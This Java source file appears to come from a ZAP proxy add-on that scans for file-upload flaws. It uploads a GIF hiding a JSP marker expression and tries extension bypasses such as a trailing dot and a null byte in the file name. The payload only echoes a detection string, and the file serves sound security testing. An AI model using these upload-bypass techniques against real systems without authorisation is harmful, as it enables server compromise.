/**
 * Copyright 2020 SasanLabs
 *
 * <p>Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file
 * except in compliance with the License. You may obtain a copy of the License at
 *
 * <p>http://www.apache.org/licenses/LICENSE-2.0
 *
 * <p>Unless required by applicable law or agreed to in writing, software distributed under the
 * License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
 * express or implied. See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.sasanlabs.fileupload.attacks.impl;

import static org.sasanlabs.fileupload.Constants.NULL_BYTE_CHARACTER;

import java.io.IOException;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import org.parosproxy.paros.network.HttpMessage;
import org.sasanlabs.fileupload.Constants;
import org.sasanlabs.fileupload.attacks.AttackVector;
import org.sasanlabs.fileupload.attacks.FileUploadAttackExecutor;
import org.sasanlabs.fileupload.attacks.FileUploadException;
import org.sasanlabs.fileupload.attacks.beans.FileParameter;
import org.sasanlabs.fileupload.matcher.impl.ContainsExpectedValueMatcher;

public class ImageBasedJSPRemoteCodeExecution implements AttackVector {

    private static final String GIF_IMAGE_JSP_INJECTED_IN_EXIF_BASE64_ENCODED =
            "R0lGODlhAQABAHAAACH5BAUAAAAAIf4mPCU9ICJTYXNhbkxhYnNfIiArICJaQVBfSWRlbnRpZmllciIgJT4ALAAAAAABAAEAAAICRAEAOw==";
    // Need to correct expected value these
    private static final String EXPECTED_VALUE = "SasanLabs_ZAP_Identifier";
    private static final String BASE_FILE_NAME = "ImageBasedJSPRCE_";

    private static final List<FileParameter> FILE_PARAMETERS =
            Arrays.asList(
                    new FileParameter("jsp", Constants.EMPTY_STRING),
                    new FileParameter("jsp", "application/x-jsp"),
                    new FileParameter("jsp.", Constants.EMPTY_STRING, true),
                    new FileParameter("jsp.", "application/x-jsp", true),
                    new FileParameter("jsp." + NULL_BYTE_CHARACTER, Constants.EMPTY_STRING, true),
                    new FileParameter("jsp." + NULL_BYTE_CHARACTER, "application/x-jsp", true));

    @Override
    public boolean execute(FileUploadAttackExecutor fileUploadAttackExecutor)
            throws FileUploadException {
        try {
            byte[] imagePayload =
                    Base64.getDecoder().decode(GIF_IMAGE_JSP_INJECTED_IN_EXIF_BASE64_ENCODED);
            HttpMessage originalMessage = fileUploadAttackExecutor.getOriginalHttpMessage();
            String charSet = originalMessage.getRequestHeader().getCharset();
            Charset requestCharSet =
                    charSet != null ? Charset.forName(charSet) : StandardCharsets.ISO_8859_1;
            String requestPayload = new String(imagePayload, requestCharSet);
            System.out.print(charSet);
            if (this.genericAttackExecutor(
                    fileUploadAttackExecutor,
                    new ContainsExpectedValueMatcher(EXPECTED_VALUE),
                    requestPayload,
                    BASE_FILE_NAME,
                    FILE_PARAMETERS)) {
                fileUploadAttackExecutor
                        .getFileUploadScanRule()
                        .raiseAlert(
                                1,
                                1,
                                this.getClass().getName(),
                                "",
                                "",
                                "",
                                "",
                                "",
                                "",
                                fileUploadAttackExecutor.getOriginalHttpMessage());
            }
        } catch (IOException e) {
            throw new FileUploadException(e);
        }
        return false;
    }
}
